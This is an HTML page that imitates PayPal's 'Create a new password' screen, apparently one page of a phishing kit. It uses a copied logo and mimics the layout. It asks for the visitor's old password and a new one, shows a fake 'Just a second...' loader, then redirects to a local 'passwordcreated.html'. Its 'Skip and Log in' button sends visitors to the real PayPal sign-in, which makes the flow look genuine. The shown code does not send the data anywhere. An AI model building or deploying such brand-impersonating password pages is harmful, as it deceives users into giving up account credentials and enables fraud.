<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Create a new password</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
    }

    body {
      background: #ffffff;
      color: #111b21;
    }

    .page {
      max-width: 480px;
      margin: 0 auto;
      padding: 24px 16px 40px;
    }

    .logo {
      margin-bottom: 24px;
    }

    .logo img {
      width: 52px;
      height: auto;
      display: block;
    }

    h1 {
      font-size: 32px;
      line-height: 1.15;
      font-weight: 700;
      margin-bottom: 12px;
      color: #111111;
    }

    .subtitle {
      font-size: 15px;
      line-height: 1.4;
      color: #3d4b5a;
      margin-bottom: 24px;
      font-weight: 500;
    }

    .card {
      background: #f5f7fa;
      border-radius: 12px;
      padding: 18px 16px;
      margin-bottom: 14px;
      display: flex;
      align-items: center;
      position: relative;
      min-height: 68px;
      transition: background-color 0.15s ease;
    }

    /* Yellow highlight (only when passwords match) */
    .card.pw-matched {
      background: #fbf7c6;
    }

    .field-main {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
    }

    .field-label {
      font-size: 14px;
      color: #6b7a89;
      margin-bottom: 6px;
      display: block;
    }

    .card input {
      border: none;
      outline: none;
      width: 100%;
      background: transparent;
      font-size: 16px;
      color: #111b21;
    }

    .card input::placeholder {
      color: #6b7a89;
    }

    /* Eye icon button (exact "eye-off" shape via SVG) */
    .eye-btn {
      margin-left: 12px;
      width: 34px;
      height: 34px;
      border: none;
      background: transparent;
      padding: 0;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }

    .eye-btn svg {
      width: 24px;
      height: 24px;
    }

    .eye-btn .eye-stroke {
      stroke: #6b7a89;
      stroke-width: 2;
      fill: none;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    /* "Passwords match" row */
    .pw-match-row {
      display: none;
      align-items: center;
      gap: 10px;
      margin: -2px 0 16px;
      color: #5b6774;
      font-size: 16px;
      font-weight: 500;
    }

    .pw-match-row.visible {
      display: flex;
    }

    .pw-match-check {
      width: 22px;
      height: 22px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      flex: 0 0 22px;
    }

    .pw-match-check svg {
      width: 22px;
      height: 22px;
    }

    .pw-match-check path {
      stroke: #00a85a;
      stroke-width: 3;
      fill: none;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .checkbox-row {
      display: flex;
      align-items: center;
      margin: 18px 0 96px;
    }

    .checkbox-row input {
      width: 22px;
      height: 22px;
      margin-right: 12px;
      cursor: pointer;
      accent-color: #0070ba;
    }

    .checkbox-row label {
      font-size: 16px;
      color: #111b21;
      cursor: pointer;
    }

    .btn-primary {
      width: 100%;
      border-radius: 999px;
      border: none;
      padding: 14px 18px;
      font-size: 18px;
      font-weight: 600;
      background-color: #034FB3;
      color: #ffffff;
      cursor: pointer;
      margin-bottom: 18px;
    }

    .btn-primary:hover {
      background-color: #02408f;
    }

    .btn-primary:active {
      background-color: #013070;
    }

    .divider {
      display: flex;
      align-items: center;
      margin-bottom: 18px;
      color: #6b7a89;
      font-weight: 500;
    }

    .divider-line {
      flex: 1;
      height: 1px;
      background: #e1e6eb;
    }

    .divider span {
      padding: 0 10px;
      font-size: 14px;
    }

    .btn-secondary {
      width: 100%;
      border-radius: 999px;
      padding: 14px 18px;
      font-size: 18px;
      font-weight: 700;
      background-color: #ffffff;
      border: 1px solid #d3d9e0;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      cursor: pointer;
      margin-bottom: 28px;
      color: #034FB3;
    }

    .btn-lock-icon {
      width: 22px;
      height: 22px;
    }

    .footer-links {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 20px;
      font-size: 14px;
    }

    .footer-links a {
      text-decoration: underline;
      color: #111b21;
    }

    /* Loading overlay */
    #loading-overlay {
      position: fixed;
      inset: 0;
      background: white;
      z-index: 9999;
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    }

    #loading-overlay.active {
      display: flex;
    }

    .spinner {
      width: 64px;
      height: 64px;
      margin-bottom: 24px;
    }
  </style>
</head>
<body>

  <div class="page">

    <!-- Logo -->
    <div class="logo">
      <img src="paypal-logo.jpeg" alt="PayPal logo" />
    </div>

    <!-- Heading -->
    <h1>Create a new password</h1>
    <p class="subtitle">
      Don’t reuse passwords, avoid personal info, and try combining words.
    </p>

    <!-- Old password -->
    <div class="card" id="card-old">
      <div class="field-main">
        <div class="field-label">Enter old password</div>
        <input type="password" id="old-password" placeholder="" autocomplete="current-password" />
      </div>
      <button type="button" class="eye-btn" aria-label="Show/hide password" data-target="old-password">
        <!-- Eye-off icon (matches screenshot style) -->
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path class="eye-stroke" d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/>
          <path class="eye-stroke" d="M9.4 9.4a4 4 0 0 0 5.2 5.2"/>
          <path class="eye-stroke" d="M14.6 14.6A4 4 0 0 0 9.4 9.4"/>
          <path class="eye-stroke" d="M3 3l18 18"/>
        </svg>
      </button>
    </div>

    <!-- New password -->
    <div class="card" id="card-new">
      <div class="field-main">
        <div class="field-label">Create password</div>
        <input type="password" id="new-password" placeholder="" autocomplete="new-password" />
      </div>
      <button type="button" class="eye-btn" aria-label="Show/hide password" data-target="new-password">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path class="eye-stroke" d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/>
          <path class="eye-stroke" d="M9.4 9.4a4 4 0 0 0 5.2 5.2"/>
          <path class="eye-stroke" d="M14.6 14.6A4 4 0 0 0 9.4 9.4"/>
          <path class="eye-stroke" d="M3 3l18 18"/>
        </svg>
      </button>
    </div>

    <!-- Confirm password -->
    <div class="card" id="card-confirm">
      <div class="field-main">
        <div class="field-label">Re-enter password</div>
        <input type="password" id="confirm-password" placeholder="" autocomplete="new-password" />
      </div>
      <button type="button" class="eye-btn" aria-label="Show/hide password" data-target="confirm-password">
        <svg viewBox="0 0 24 24" aria-hidden="true">
          <path class="eye-stroke" d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12z"/>
          <path class="eye-stroke" d="M9.4 9.4a4 4 0 0 0 5.2 5.2"/>
          <path class="eye-stroke" d="M14.6 14.6A4 4 0 0 0 9.4 9.4"/>
          <path class="eye-stroke" d="M3 3l18 18"/>
        </svg>
      </button>
    </div>

    <!-- Password match row -->
    <div class="pw-match-row" id="pwMatchRow" aria-live="polite">
      <span class="pw-match-check" aria-hidden="true">
        <svg viewBox="0 0 24 24">
          <path d="M20 6L9 17l-5-5" />
        </svg>
      </span>
      <span>Passwords match</span>
    </div>

    <!-- Checkbox -->
    <div class="checkbox-row">
      <input type="checkbox" id="logout-all" />
      <label for="logout-all">Log out of all devices</label>
    </div>

    <!-- Save button -->
    <button class="btn-primary" id="save-password-btn">Save Password</button>

    <!-- Divider -->
    <div class="divider">
      <div class="divider-line"></div>
      <span>or</span>
      <div class="divider-line"></div>
    </div>

    <!-- Skip button -->
    <button class="btn-secondary" id="skip-btn">
      <img src="lock-icon.jpeg" alt="Lock" class="btn-lock-icon" />
      <span>Skip and Log in</span>
    </button>

    <!-- Footer -->
    <div class="footer-links">
      <a href="#">Contact Us</a>
      <a href="#">Privacy</a>
      <a href="#">Legal</a>
      <a href="#">Worldwide</a>
    </div>
  </div>

  <!-- Loading screen (matches your screenshot) -->
  <div id="loading-overlay">
    <div class="spinner">
      <!-- Simple PayPal-style blue spinner -->
      <svg width="64" height="64" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <linearGradient x1="8.042%" y1="0%" x2="65.682%" y2="23.865%" id="gradient">
            <stop stop-color="#0070BA" stop-opacity="0" offset="0%"/>
            <stop stop-color="#0070BA" stop-opacity=".631" offset="63.146%"/>
            <stop stop-color="#0070BA" offset="100%"/>
          </linearGradient>
        </defs>
        <g fill="none" fill-rule="evenodd">
          <g transform="translate(1 1)">
            <path d="M36 18c0-9.94-8.06-18-18-18" stroke="url(#gradient)" stroke-width="2">
              <animateTransform
                attributeName="transform"
                type="rotate"
                from="0 18 18"
                to="360 18 18"
                dur="0.9s"
                repeatCount="indefinite"/>
            </path>
            <circle fill="#0070BA" cx="36" cy="18" r="1">
              <animateTransform
                attributeName="transform"
                type="rotate"
                from="0 18 18"
                to="360 18 18"
                dur="0.9s"
                repeatCount="indefinite"/>
            </circle>
          </g>
        </g>
      </svg>
    </div>
    <div style="font-size: 20px; font-weight: 500; color: #111b21;">
      Just a second...
    </div>
  </div>

  <script>
    // Password visibility toggle
    document.querySelectorAll('.eye-btn').forEach(btn => {
      btn.addEventListener('click', () => {
        const targetId = btn.getAttribute('data-target');
        const input = document.getElementById(targetId);
        if (!input) return;
        input.type = (input.type === 'password') ? 'text' : 'password';
      });
    });

    const newPassEl = document.getElementById('new-password');
    const confirmEl = document.getElementById('confirm-password');
    const cardNew = document.getElementById('card-new');
    const cardConfirm = document.getElementById('card-confirm');
    const pwMatchRow = document.getElementById('pwMatchRow');

    function updateMatchUI() {
      const newPass = (newPassEl.value || '').trim();
      const confirm = (confirmEl.value || '').trim();
      const isMatch = newPass.length > 0 && newPass === confirm;

      cardNew.classList.toggle('pw-matched', isMatch);
      cardConfirm.classList.toggle('pw-matched', isMatch);
      pwMatchRow.classList.toggle('visible', isMatch);
    }

    newPassEl.addEventListener('input', updateMatchUI);
    confirmEl.addEventListener('input', updateMatchUI);

    // Save Password → show loader → redirect
    document.getElementById('save-password-btn').addEventListener('click', (e) => {
      e.preventDefault();

      const newPass = newPassEl.value.trim();
      const confirm = confirmEl.value.trim();

      if (!newPass || newPass !== confirm) {
        alert("Passwords don't match or new password is empty.");
        return;
      }

      // Show loading
      document.getElementById('loading-overlay').classList.add('active');

      // Redirect after ~2 seconds
      setTimeout(() => {
        window.location.href = 'passwordcreated.html';
      }, 2000);
    });

    // Skip and Log in → direct redirect to real PayPal
    document.getElementById('skip-btn').addEventListener('click', (e) => {
      e.preventDefault();
      window.location.href = 'https://www.paypal.com/signin?locale.x=en_US';
    });
  </script>

</body>
</html>
